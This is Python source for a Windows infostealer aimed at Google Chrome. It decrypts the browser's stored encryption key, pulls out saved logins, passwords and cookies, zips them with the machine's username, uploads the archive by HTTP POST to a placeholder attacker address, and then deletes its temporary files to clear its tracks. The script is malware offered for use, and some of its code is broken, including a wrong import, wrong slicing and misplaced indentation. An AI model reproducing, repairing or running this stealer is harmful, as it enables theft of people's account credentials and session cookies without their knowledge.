import	os
import	json
import	base
import	sqlite3
import	win32crypt
from	Crypto.Cipher	import AES
import	shutil
from	zipfile	import	ZipFile
import	requests

def	get_encryption_key():
	local_state_path = os.path.join(os.environ["USERPROFILE"],
								 "AppData", "Local", "Google", "Chrome",
								 "User Data", "Local State")
	with	open(local_state_path, "r", encoding="utf-8") as f:
		local_state = f.read()
		local_state = json.loads(local_state)

	# decode the encryption key from Base64
	key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
	# remove DPAPI str
	key = key[5:]
	# return decrypted key that was originally encrypted

	return	win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def	decrypt_password(password, key):
	try:
		# get the initialization vector
		iv = password[3:15]
		password = password[15:]
		# generate cipher
		cipher = AES.new(key, AES.MODE_GCM, iv)
		# decrypt password
		return	cipher.decrypt(password)[: 16].decode()
	except:
		try:
			return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
		except:
			return ""

def	decrypt_data_cookies(data, key):
	try:
		# get the initialization vector
		iv = data[3:15]
		data = data[15:]
		# generate cipher
		cipher = AES.new(key, AES.MODE_GCM, iv)
		# decrypt password
		return cipher.decrypt(data)[:-16].decode()
	except:
		try:
			return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
		except:
			return ""

def	main():
	# get the AES key
	key = get_encryption_key()
	os.mkdir('tmp')

################################################## Logins Save #######################################
# local sqlite Chrome database path
db_path_login_data = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
								  "Google", "Chrome", "User Data", "default", "Login Data")

# copy the file to another location
# as the database will be locked if chrome is currently running
filename_login = "LoginData.db"
shutil.copyfile(db_path_login_data, filename_login)
# connect to the database
list_of_data = []
data_logins = {}

db = sqlite3.connect(filename_login)
cursor = db.cursor()

cursor.execute("select origin_url, action_url, username_value, password_value, data_created, data_last_used from logins order by date_created")
# iterate over all rows
for	row	in cursor.fetchall():
	origin_url = row[0]
	action_url = row[1]
	username = row[2]
	password = decrypt_password(row[3], key)

	if username or password:
		data_logins = {
			'Origin URL' : origin_url,
			'Action URL' : action_url,
			'Username' : username,
			'Password' : password
		}
		list_of_data.append(data_logins)
	else:
		continue
	#print("="*50)
cursor.close()
db.close()

################################################## Cookies #######################################

# local sqlite Chrome cookie database path
db_path_cookie = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
							  "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
# copy the file to current directory
# as the database will be locked if chrome is currently open
filename_cookie = "Cookies.db"
if not os.path.isfile(filename_cookie):
	# copy file when does not exist in the current directory
	 shutil.copyfile(db_path_cookie, filename_cookie)

db = sqlite3.connect(filename_cookie)
# get the cookies form 'cookies' table
cursor = db.cursor()
cursor.execute("""
SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value
FROM cookies""")

list_of_cookies = []
cookies_data = {}
for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
	if not value:
		decrypted_value_cookie = decrypt_data_cookies(encrypted_value, key)
	else:
		# already decrypted
		decrypted_value_cookie = value

	cookies_data = {
		"Host": host_key,
		"Cookie name": name,
		"Cookie value": decrypted_value_cookie
	}
	list_of_cookies.append(cookies_data)

# close connection
db.close()

################################################## Save Data #######################################

file_login_save = open('./tmp/login_save.txt', 'a')
for	data_logins in list_of_data:
	#print(data)
	file_login_save.write(str(data_logins))
	file_login_save.write('\n')
file_login_save.close()

file_cookie_save = open('./tmp/cookies_save.txt', 'a')
for data_cookies in list_of_cookies:
	file_cookie_save.write(str(data_cookies))
	file_cookie_save.write('\n')
file_cookie_save.close()

print('Files Created!')

file_name_machine = open('./tmp/name_machine.txt', 'a')
file_name_machine.write(f'Username: {os.environ["USERNAME"]}')
file_name_machine.close()

################################################## ZIP and SEND -> http #######################################
name = os.environ.get('USERNAME')
zipObj = ZipFile('./tmp/data_send.zip', 'w')
# Add muliple files to the zip
zipObj.write('./tmp/login_save.txt')
zipObj.write('./tmp/cookies_save.txt')
zipObj.write('./tmp/name_machine.txt')
# close the Zip File
zipObj.close()
print("Zip created!")

url = 'IP or URL'
files ={'file':open('./tmp/data_send.zip', 'rb')}

r = requests.post(url, files=files)
print (r.text)
################################################## Clear tracks #######################################
try:
	os.remove(filename_login)
	os.remove(filename_cookie)
except:
	pass

if __name__ == "__main__":
	main()
	shutil.rmtree('tmp', ignore_errors=False)
